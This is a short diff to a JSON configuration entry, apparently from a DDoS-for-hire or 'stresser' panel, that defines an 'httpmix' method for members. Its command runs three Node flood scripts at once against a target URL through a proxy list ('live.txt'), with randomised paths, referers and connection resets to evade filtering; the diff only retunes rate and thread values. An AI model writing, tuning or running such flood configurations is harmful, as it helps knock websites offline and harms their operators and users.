@@ -1,6 +1,6 @@
 {
     "httpmix": {
-        "command": "node --max-old-space-size=65536 h1 POST url live.txt 60 999 8 randomstring=true & node --max-old-space-size=65536 h2 -m POST -u url -s 60 -p live.txt --full true --delay 1 -d false & node --max-old-space-size=65536 httpmix POST url 60 4 128 live.txt --http mix --query 1 --delay 1 --referer rand --close --randpath --parsed --reset",
+        "command": "node --max-old-space-size=65536 h1 POST url live.txt 60 999 10 randomstring=true & node --max-old-space-size=65536 h2 -m POST -u url -s 60 -t 1 -p live.txt --full true --delay 1 -d false & node --max-old-space-size=65536 httpmix POST url 60 1 128 live.txt --http mix --query 1 --delay 1 --referer rand --close --randpath --parsed --reset",
         "url": "url", 
         "time": 60,
         "visibility": "MEMBER" 
